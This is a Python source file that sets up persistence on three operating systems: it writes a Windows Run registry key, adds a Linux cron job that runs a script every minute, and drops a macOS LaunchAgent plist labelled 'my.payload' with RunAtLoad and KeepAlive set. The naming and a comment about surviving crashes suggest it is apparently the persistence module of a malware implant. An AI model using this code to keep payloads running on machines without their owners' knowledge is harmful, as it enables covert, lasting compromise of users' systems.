import platform, os

if platform.system() == 'Windows':

    import winreg

    REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

    def set_reg(name, value):
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
            return True
        except Exception as e:
            print(str(e))
            return False

    def get_reg(name):
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
            value, regtype = winreg.QueryValueEx(registry_key, name)
            winreg.CloseKey(registry_key)
            return value
        except Exception as e:
            print(str(e))
            return None

elif platform.system() == 'Linux':

    from crontab import CronTab

    def create_cron_job(path_to_script):
        my_cron = CronTab(user='')
        my_cron.new(command='python ' + path_to_script)
        my_cron.job.minute.every(1)
        my_cron.write()

    def add_to_systemd():
        pass
        # TODO: create init script at /etc/systemd/system/multi-user.target.wants/service.service
        #       and start via: sudo systemctl enable service.service
        #       important: must have Restart=always under [Service] to survive crashes


elif platform.system() == 'Darwin':

    def create_launch_agent_plist(path_to_script):
        label = 'my.payload'
        keep_alive = 'true'
        user = os.getlogin()
        item = '''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
              <dict>
                <key>Label</key>
                <string>''' + label + '''</string>
                <key>Program</key>
                <string>''' + path_to_script + '''</string>
                <key>ProgramArguments</key>
                <array>
                  <string>''' + path_to_script + '''</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>OnDemand</key>
                <''' + keep_alive + '''/>
                <key>KeepAlive</key>
                <''' + keep_alive + '''/>
              </dict>
            </plist>
        '''
        plist_file_path = os.path.join('/Users', user, 'Library/LaunchAgents', 'payload.plist')

        with open(plist_file_path, 'w') as f:
            f.write(item)
